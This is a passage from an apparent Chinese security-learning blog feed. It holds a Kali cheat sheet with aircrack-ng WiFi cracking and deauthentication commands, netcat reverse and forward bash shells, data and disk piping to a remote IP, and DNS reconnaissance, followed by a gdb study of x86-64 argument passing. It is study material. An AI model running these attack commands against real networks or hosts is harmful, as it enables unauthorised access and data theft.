class="headerlink" title="汇编指令"></a>汇编指令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">数据传送与访问：mov</span><br><span class="line"></span><br><span class="line">算术运算与逻辑运算：</span><br><span class="line">  inc/dec    #操作数±1</span><br><span class="line">  add/sub    #长度相同的操作数相加减</span><br><span class="line">  and/or     #按位逻辑与/或</span><br><span class="line">  mul        #乘法操作</span><br><span class="line">  xor        #异或操作，常用做寄存器值置零</span><br><span class="line">  cmp        #比较两个值</span><br><span class="line">  neg        #将操作数转换为二进制补码，并将操作数的符号位取反</span><br><span class="line">    </span><br><span class="line">跳转指令与循环指令：</span><br><span class="line">  jmp        #无条件跳转指令，一般需要使用一个标号来标识，可以实现循环</span><br><span class="line">  LOOP       #循环指令，每循环一次循环计数寄存器减1</span><br><span class="line">  je         #条件跳转，链接：https://blog.csdn.net/ssihc0/article/details/5215044</span><br><span class="line">  test       #与AND命令有相同效果，只是Test指令不改变AX和BX的内容，而AND指令会把结果保存到AX中</span><br><span class="line"></span><br><span class="line">栈与函数调用：</span><br><span class="line">  push       #入栈，详细操作P41</span><br><span class="line">  pop        #从栈中pop一个值，给ebp</span><br><span class="line"></span><br><span class="line">使用栈保存函数返回地址：</span><br><span class="line">  call       #call调用子函数时，下一条指令的地址作为返回地址存入栈中</span><br><span class="line">         #相当于   push IP</span><br><span class="line">             #        jmp near ptr 标号    这两条汇编</span><br><span class="line">             #https://blog.csdn.net/u013018721/article/details/51264199</span><br><span class="line">  ret        #往栈上高地址一个单位取地址当做跳转地址   *******</span><br><span class="line">        #链接：https://blog.csdn.net/qq_37340753/article/details/81585083</span><br><span class="line"></span><br><span class="line">其他：</span><br><span class="line">  lea   #官方解释Load Effective Address，即装入有效地址的意思，它的操作数就是地址</span><br><span class="line">  nop   #空操作，链接：https://www.cnblogs.com/shangzhijian/p/4994028.html</span><br><span class="line">  leave #mov esp,ebp和pop ebp</span><br><span class="line">        #链接：https://blog.csdn.net/striver1205/article/details/25216699</span><br><span class="line">        #链接：https://blog.csdn.net/zhangxinrun/article/details/5888425</span><br><span class="line">  int 0x80   #系统调用</span><br><span class="line"></span><br></pre></td></tr></table></figure><br/><br/><h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># emm... 其实有个类似于pwndbg里的vmmap操作的指令想记一下</span></span><br><span class="line"><span class="comment"># 想想算了，懒得去找了，反正pwndbg挺好用的</span></span><br></pre></td></tr></table></figure><br/><br/><h3 id="kali终端"><a href="#kali终端" class="headerlink" title="kali终端"></a>kali终端</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#常用</span></span><br><span class="line">  <span class="comment">#常用的跟linux差不多</span></span><br><span class="line">  <span class="comment">#查看指令帮助</span></span><br><span class="line">    $ &lt;指令&gt; -h</span><br><span class="line">    $ &lt;指令&gt; --<span class="built_in">help</span></span><br><span class="line">    $ man &lt;指令&gt;</span><br><span class="line">    $ info &lt;指令&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#aircraft  --最基本的破解wifi手法</span></span><br><span class="line">  $ ifconfig                   <span class="comment">##检查网卡是否连接</span></span><br><span class="line">  $ airmon-ng  start wlan0     <span class="comment">##设置监听模式</span></span><br><span class="line">  $ airodump-ng  wlan0mon      <span class="comment">##扫描附近wifi</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">##监听目标流量</span></span><br><span class="line">  $ airodump-ng --bssid &lt;wifi的Mac地址&gt; -c &lt;信道号&gt; -w &lt;生成文件的存储路径&gt; wlan0mon</span><br><span class="line">  $ airodump-ng --bssid 74:54:27:90:AA:E2 -c 11 -w /home/xy666/Desktop/wifi/ wlan0mon</span><br><span class="line">  </span><br><span class="line">  <span class="comment">##攻击指定客户端</span></span><br><span class="line">  $ aireplay-ng -0 &lt;攻击次数&gt; -a &lt;wifi的Mac地址&gt; -c &lt;被攻击设备的Mac地址&gt; wlan0mon</span><br><span class="line">  $ aireplay-ng -0 20 -a 74:54:27:90:AA:E2 -c 04:10:6B:E6:A6:B0 wlan0mon</span><br><span class="line">  </span><br><span class="line">  <span class="comment">##暴力破解</span></span><br><span class="line">  $ aircrack-ng -w &lt;字典路径&gt; &lt;生成的.<span class="built_in">cap</span>文件路径&gt;</span><br><span class="line">  $ aircrack-ng -w /usr/share/wordlists/rockyou.txt /home/xy666/Desktop/wifi/-56.cap</span><br><span class="line">  </span><br><span class="line"><span class="comment">#nc</span></span><br><span class="line">  $ nc -vn &lt;ip&gt; &lt;端口&gt;           <span class="comment">#-v显示详细连接信息，-n不解析域名，后跟IP地址及端口</span></span><br><span class="line">  $ ls | nc -vn 192.168.0.5 1724</span><br><span class="line">  $ nc -vn 123.125.50.29 110    <span class="comment">#连接服务器端口</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">#传输信息(电子取证)</span></span><br><span class="line">  $ nc -l -p &lt;端口&gt;    <span class="comment">#开启一个监听端口，可供他人连接，客户端-nv可连接过来</span></span><br><span class="line">  $ ll | nc -nv &lt;ip&gt; &lt;port&gt;    $ ps aux | nc -nv &lt;ip&gt; &lt;port&gt;</span><br><span class="line">  <span class="comment">#传输文件</span></span><br><span class="line">  $ nc -lp &lt;port&gt; &gt; 1.mp4            <span class="comment"># &gt;(写入)，接收端，服务器端</span></span><br><span class="line">  $ nc -nv &lt;ip&gt; &lt;port&gt; &lt; 1.mp4 -q 1  <span class="comment"># &lt;(输出)，发送端，客户端</span></span><br><span class="line">  $ nc -q 1 -lp &lt;port&gt; &lt; a.mp4       <span class="comment"># 发送端，服务器端</span></span><br><span class="line">  $ nc -nv &lt;ip&gt; &lt;port&gt; &gt; 2.mp4       <span class="comment"># 接收端，客户端</span></span><br><span class="line">  <span class="comment">#传输目录</span></span><br><span class="line">  $ tar -cvf - music/ | nc -lp &lt;port&gt;  <span class="comment">#目录打包成文件再传输</span></span><br><span class="line">  $ nc -nv &lt;ip&gt; &lt;port&gt; | tar -xvf -    <span class="comment">#接收数据并解包</span></span><br><span class="line">  <span class="comment">#加密传输文件</span></span><br><span class="line">  $ nc -lp &lt;port&gt; | mcrypt --flush - Fbqd -a rijndael-256 -m ecb &gt; 1.mp4</span><br><span class="line">  $ mcrypt --flush - Fbqd -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv &lt;ip&gt; &lt;port&gt;</span><br><span class="line">  <span class="comment">#流媒体服务</span></span><br><span class="line">  $ cat 1.mp4 | nc -lp 333</span><br><span class="line">  $ nc -nv &lt;ip&gt; &lt;port&gt; | mplayer -vo xll -cache 3000 -</span><br><span class="line">  </span><br><span class="line">**<span class="comment">#端口扫描(*)(hack)*****************************************</span></span><br><span class="line">  $ nc -nvz &lt;ip&gt; &lt;端口范围&gt;    <span class="comment">#端口值最大范围：1-65535</span></span><br><span class="line">  $ nc -vnzu &lt;ip&gt; &lt;端口范围&gt;   <span class="comment">#z判断端口是否开启,u探测UDP端口</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">#远程克隆硬盘(电子取证)</span></span><br><span class="line">  $ nc -lp &lt;port&gt; | dd of=/dev/sda       <span class="comment">#sda：硬盘</span></span><br><span class="line">  $ dd <span class="keyword">if</span>=/dev/sda | nc -nv &lt;ip&gt; &lt;port&gt; </span><br><span class="line">  </span><br><span class="line">**<span class="comment">#远程控制(*)(hack)*****************************************</span></span><br><span class="line">  $ nc -lp &lt;port&gt; -c bash   <span class="comment">#正向，windows用户把bash改成cmd</span></span><br><span class="line">  $ nc &lt;ip&gt; &lt;port&gt;          <span class="comment">#正向</span></span><br><span class="line">  $ nc -lp &lt;port&gt;           <span class="comment">#反向，服务器端</span></span><br><span class="line">  $ nc &lt;ip&gt; &lt;port&gt; -c bash  <span class="comment">#反向，客户端，客户端向服务器端交出shell</span></span><br><span class="line">  <span class="comment">#反向控制可理解为远控桌面，叫别人过来帮忙操作，任务12-16min，etc/init.d目录</span></span><br><span class="line">  <span class="comment">#服务器端和客户端都可以是用户，这里把开启端口让别人连接的一方称为服务器端</span></span><br><span class="line">  &lt;!--假如防火墙禁用了所有外来访问用户的流量，只允许一个80端口访问用户，</span><br><span class="line">      那么黑客没法通过正向方法来获取用户的shell，</span><br><span class="line">      只能反向让用户自己启动电脑时交出shell。</span><br><span class="line">      正向时用户作为服务器端开启shell端口，黑客作为用户端连接shell端口获取shell。</span><br><span class="line">      反向时黑客作为服务器端开启获取shell的端口，</span><br><span class="line">      用户启动机器时加载黑客修改后的etc/init.d目录中</span><br><span class="line">      的文件时主动向黑客的服务器端交出shell。</span><br><span class="line">      反向利用的前提条件是黑客之前就通过其他漏洞入侵过用户的机器并修改了etc/init.d</span><br><span class="line">      这个应该就是别人常说的反弹shell</span><br><span class="line">      当然，若网络管理员安全意识较高，设置防火墙禁止了用户所有对外访问的流量，</span><br><span class="line">      那黑客也就无法再利用反弹shell了。</span><br><span class="line">  --&gt;</span><br><span class="line">  <span class="comment">#Ncat，包含于nmap工具包中，弥补nc不可加密缺陷，安全传输</span></span><br><span class="line">  $ ncat -c bash --allow &lt;ip&gt; -vnl &lt;port&gt; --ssl</span><br><span class="line">  $ ncat -nv &lt;ip&gt; &lt;port&gt; --ssl</span><br><span class="line">  </span><br><span class="line"><span class="comment">#wireshark</span></span><br><span class="line">  <span class="comment">#图形界面操作，任务12-15</span></span><br><span class="line">  <span class="comment">#筛选器 filter</span></span><br><span class="line">    <span class="comment">#dns  筛选dns协议包</span></span><br><span class="line">    <span class="comment">#!(ip.src == 192.168.1.118)  不选择ip源为192.168.1.118的数据包</span></span><br><span class="line">    <span class="comment">#(udp) &amp;&amp; !(ip.addr == 192.168.1.118)  udp与......</span></span><br><span class="line">    <span class="comment">#!(ip.dst == 192.168.1.118)  不选择目标ip为......的数据包 </span></span><br><span class="line">    </span><br><span class="line">  <span class="comment">#常见协议包</span></span><br><span class="line">    <span class="comment">#任务13</span></span><br><span class="line">    <span class="comment">#arp欺骗</span></span><br><span class="line">  <span class="comment">#同类工具：Sniffer、Cace/riverbed</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">#TCPDUMP linux自带 默认抓68字节</span></span><br><span class="line">    <span class="comment">#抓包</span></span><br><span class="line">      $ tcpdump -i eth0 -s 0 -w file.pcap  <span class="comment">#-s把包抓完整,-w保存到指定文件中</span></span><br><span class="line">      $ tcpdump -A -r file.pcap  <span class="comment">#-A以ASCLL码形式显示(-X 16进制形式)，-r读取抓到的包</span></span><br><span class="line">      $ tcpdump -i eth0 port 22</span><br><span class="line">    <span class="comment">#读取抓包文件</span></span><br><span class="line">      $ tcpdump -r file.pcap</span><br><span class="line">    <span class="comment">#筛选  -n不把ip地址解析成域名  awk &#x27;&#123;print $3&#125;&#x27;只打印第三列</span></span><br><span class="line">      $ tcpdump -n -r http.cap | awk <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> | sort -U</span><br><span class="line">      $ tcpdump -n src host 145.254.160.237 -r http.cap    <span class="comment">#src源ip</span></span><br><span class="line">      $ tcpdump -n dst host 145.254.160.237 -r http.cap    <span class="comment">#dst目标ip</span></span><br><span class="line">      $ tcpdump -n port 53 -r http.cap                     <span class="comment">#port端口</span></span><br><span class="line">      $ tcpdump -nX port 80 -r http.cap                <span class="comment">#-X 以16进制显示</span></span><br><span class="line">    <span class="comment">#高级筛选</span></span><br><span class="line">      <span class="comment">#任务15</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#被动信息收集</span></span><br><span class="line">  <span class="comment">#DNS信息收集——NSLOOKUP</span></span><br><span class="line">    $ nslookup </span><br><span class="line">    &gt; www.sina.com</span><br><span class="line">    &gt; <span class="built_in">type</span>=a    <span class="comment">#参数除a(主机记录)外还可以是：mx(邮件交换记录)、ns(域名服务器)、any(所有域名记录)、ptr(反向解析)等</span></span><br><span class="line">        <span class="comment"># &gt; set type=mx    #type可简写为q</span></span><br><span class="line">        <span class="comment"># &gt; sina.com       </span></span><br><span class="line">        <span class="comment"># &gt; set q=ptr      #通过ip查域名，反向查询，一个域名可以解析为多条主机记录、多个cname记录</span></span><br><span class="line">        <span class="comment"># &gt; 202.108.3.242</span></span><br><span class="line">    &gt; server 202.106.0.20  <span class="comment">#设置使用的域名服务器，server 8.8.8.8</span></span><br><span class="line">    spf <span class="comment">#反垃圾邮件查询，记录类型：twxt</span></span><br><span class="line">    $ nslookup -q=any 163.com 114.114.114.114    <span class="comment">#114.114.114.114是指定的DNS域名</span></span><br><span class="line">    $ nslookup -<span class="built_in">type</span>=ns example.com 156.154.70.22</span><br><span class="line">  </span><br><span class="line">  <span class="comment">#DNS信息收集——DIG</span></span><br><span class="line">    <span class="comment">#参数： +noall(什么也不输出) +answer(与noall搭配只看部分信息)  过滤查询结果</span></span><br><span class="line">      $ dig sina.com any @8.8.8.8  <span class="comment">#等价于nslookup sina.com -type=any 8.8.8.8</span></span><br><span class="line">      $ dig sina.com ns            <span class="comment">#查询新浪的ns记录</span></span><br><span class="line">      $ dig mail.163.com any</span><br><span class="line">      $ dig +noall +answer mail.163.com any | awk <span class="string">&#x27;&#123;print $5&#125;&#x27;</span>  <span class="comment">#awk &#x27;&#123;print $5&#125;&#x27;输出第5列</span></span><br><span class="line">      $ dig 163.com mx             <span class="comment">#查询163.com的mx记录</span></span><br><span class="line">      $ dig @8.8.8.8 www.sina.com mx     <span class="comment">#8.8.8.8是谷歌浏览器的dns服务器</span></span><br><span class="line">      $ dig www.sina.com any</span><br><span class="line">      $ dig +noall +answer -x 8.8.8.8    <span class="comment">#反向查询</span></span><br><span class="line">      $ dig -x 220.181.14.157      <span class="comment">#dig反向查询</span></span><br><span class="line">    <span class="comment">#查询DNS服务器bind版本信息  任务17 20min</span></span><br><span class="line">      $ dig +noall +answer txt chaos VERSION.BIND @ns3.dnsv4.com</span><br><span class="line">      $ dig +noall +answer txt chaos VERSION.BIND @ns2.sina.com    </span><br><span class="line">        &lt;!--一般用户不需要知道版本信息，而黑客可以利用，所以通常禁止输出版本信息，导致查不到--&gt;   </span><br><span class="line">      $ dig +trace www.sina.com    <span class="comment">#dns追踪，任务17抓包演示</span></span><br><span class="line">      $ dig @nsl.example.com example.com axfr    <span class="comment">#axfr:Request for full zone transfer</span></span><br><span class="line">      $ host -T -l sina.com ns3.sina.com</span><br><span class="line">    <span class="comment">#DNS字典爆破</span></span><br><span class="line">      $ fierce -dnsserver 8.8.8.8 -dns sina.com.cn -wordlist &lt;字典所在目录的路径&gt;/a.txt  </span><br><span class="line">      <span class="comment">#8.8.8.8：指定的dns服务器，-dns：指定要查的域这里为sina.com.cn，a.txt：使用的爆破字典</span></span><br><span class="line">        $ dpkg -L fierce</span><br><span class="line">        $ more /usr/lib/python3/dist-packages/fierce/lists/20000.txt</span><br><span class="line">        $ cat /usr/lib/python3/dist-packages/fierce/lists/20000.txt | grep www</span><br><span class="line">      $ dnsdict6 -d4 -t 16 -x xina.com    <span class="comment">#讲师推荐使用这条命令去爆破</span></span><br><span class="line">      <span class="comment">#6表示不仅支持ipv6也支持ipv4，-t指定线程数上面是16个线程，-x指定使用什么级别的字典 任务18 30min</span></span><br><span class="line">      $ dnsenum -f dnsbig.txt -dnsserver 8.8.8.8 sina.com -o sina.xml</span><br><span class="line">      $ dnsmap sina.com -w dns.txt</span><br><span class="line">      $ dnsrecon -d sina.com --lifetime 10 -t brt -D dnsbig.txt</span><br><span class="line">      $ dnsrecon -t std -d sina.com</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><br/><br/><h3 id="widows命令行"><a href="#widows命令行" class="headerlink" title="widows命令行"></a>widows命令行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  win+R  打开cmd  (shutdown.exe /r /o /f /t 00、regedit、dxdiag)</span><br><span class="line">&gt; ipconfig      <span class="comment">#无线局域网适配器 WLAN:  IPv4地址 即本机IP地址</span></span><br><span class="line">&gt; ping &lt;ip/域名&gt;</span><br></pre></td></tr></table></figure><br/><br/>]]></content>
    
    
    <summary type="html">常用</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>函数参数的入栈顺序(64位)</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/08/07/64%E4%BD%8D%E4%B8%8B%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%E7%9A%84%E4%BC%A0%E9%80%92/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/08/07/64%E4%BD%8D%E4%B8%8B%E5%87%BD%E6%95%B0%E5%8F%82%E6%95%B0%E7%9A%84%E4%BC%A0%E9%80%92/</id>
    <published>2022-08-07T08:42:53.000Z</published>
    <updated>2022-08-20T08:29:41.156Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">关于64位下函数参数的传递是怎样的，我有点懵，参数到底是从左往右依次存入寄存器|栈</span><br><span class="line">还是从右往左依次存入寄存器|栈，这里我直接写代码用gdb调试研究</span><br><span class="line"></span><br><span class="line">rdi、rsi、rdx、rcx、r8、r9依次存储函数的第1、2、3、4、5、6个参数</span><br><span class="line"><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span></span><br><span class="line"><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;<span class="name">b</span> <span class="attr">color</span>=<span class="string">&quot;red&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注：直接看下面的again and again就行，其他大都是些错误的分析判断</p><br/><h1 id="源C代码"><a href="#源C代码" class="headerlink" title="源C代码"></a>源C代码</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">3</span>,b=<span class="number">4</span>,c=<span class="number">5</span>,d=<span class="number">6</span>;</span><br><span class="line">    <span class="keyword">char</span> e=<span class="string">&#x27;g&#x27;</span>;</span><br><span class="line">    <span class="keyword">char</span> *msg=<span class="string">&quot;abcdefg123456789&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    write(<span class="number">1</span>,msg,<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\na=%d b=%d c=%d d=%d e=%c msg=%s a=%d e=%c\n&quot;</span>,a,b,c,d,e,msg,a,e);</span><br><span class="line"></span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <br/><h1 id="编译指令"><a href="#编译指令" class="headerlink" title="编译指令"></a>编译指令</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ gcc &lt;文件名&gt;.c -o &lt;二进制文件名&gt;</span><br><span class="line">$ gdb &lt;二进制文件名&gt;</span><br><span class="line"></span><br><span class="line">C文件名我起的 ceshi.c ，二进制文件名我起的 ceshi，所以指令如下：</span><br><span class="line"></span><br><span class="line">$ gcc ceshi.c -o ceshi</span><br><span class="line">$ gdb ceshi</span><br></pre></td></tr></table></figure><br/><h1 id="调试结果"><a href="#调试结果" class="headerlink" title="调试结果"></a>调试结果</h1><p><strong>write(1,msg,10);</strong></p><p><img src="image-20220807165708003.png" alt="image-20220807165708003"></p><p><strong>printf(“\na=%d b=%d c=%d d=%d e=%c msg=%s a=%d e=%c\n”,a,b,c,d,e,msg,a,e);</strong></p><p><img src="image-20220807170428144.png" alt="image-20220807170428144"></p><p><img src="image-20220807171018867.png" alt="image-20220807171018867"></p><p>出现疑问：为什么是参数9先入栈？难道说参数入 寄存器|栈 顺序是从右往左，参数值依次从左往右标1、2、3……？</p><p>重新看write函数进行验证：的确是参数3先入栈然后依次是参数2、参数1入栈。<b color="red">此处为上方的疑问的答案</b></p><p><img src="image-20220807171514727.png" alt="image-20220807171514727"></p><p>注：上面显示的是edx，不是rdx，反正我不知道为什么，把ebx理解为rdx的后32位就行</p><p><b color="red">解答：编译器优化，使用edx可以增加效率等</b></p><p>重新看printf函数进行验证：</p><p>出了点小事故，该write和printf都仅用一个msg字符串，不好区分不利于分析</p><h1 id="again"><a href="#again" class="headerlink" title="again"></a>again</h1><p>这里重新给出C代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">3</span>,b=<span class="number">4</span>,c=<span class="number">5</span>,d=<span class="number">6</span>;</span><br><span class="line">    <span class="keyword">char</span> e=<span class="string">&#x27;g&#x27;</span>;</span><br><span class="line">    <span class="keyword">char</span> *msg=<span class="string">&quot;abcdefg123456789&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> *abc=<span class="string">&quot;aaaabbbbccccdddd&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    write(<span class="number">1</span>,msg,<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\na=%d b=%d c=%d d=%d e=%c msg=%s abc=%s a=%d e=%c\n&quot;</span>,a,b,c,d,e,msg,abc,a,e);</span><br><span class="line"></span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $ rm  ceshi</span></span><br><span class="line"><span class="comment">// $ gcc ceshi.c -o ceshi</span></span><br><span class="line"><span class="comment">// $ gdb ceshi</span></span><br></pre></td></tr></table></figure><h1 id="参数入栈顺序细究"><a href="#参数入栈顺序细究" class="headerlink" title="参数入栈顺序细究"></a>参数入栈顺序细究</h1><p> 1、write函数执行前</p><p><img src="image-20220807172934140.png" alt="image-20220807172934140"></p><p>2、printf(“\na=%d b=%d c=%d d=%d e=%c msg=%s abc=%s a=%d e=%c\n”,a,b,c,d,e,msg,abc,a,e);</p><p><img src="image-20220807173142251.png" alt="image-20220807173142251"></p><p>printf第一个参数：”\na=%d b=%d c=%d d=%d e=%c msg=%s abc=%s a=%d e=%c\n”</p><p>第二个：a</p><p>第三个：b</p><p>第四个：c</p><p>第五个：d</p><p>第六个：e</p><p><strong>第七个：msg</strong></p><p><strong>第八个：abc</strong></p><p>第九个：a</p><p>第十个：e</p><p>前两张图的诡异之处：</p><p>①：先是低地址(0x7fffffffdd70)上的msg指针入栈，再是高地址(0x7fffffffdd78)上的abc指针入栈</p><p>​        而我们的栈是从高地址生长。思考了一下，上面是通过指针直接将数据写入栈上，</p><p>​        可能是因为这样效率高吧，反正这也是可以理解的，目前细究感觉也没太大意义，暂时打住。</p><p>②：它只将printf后四个参数的前两个字符串地址入栈，后面的int、char暂时都没进行入栈</p><p>​        解释：应该是这样做效率高</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b 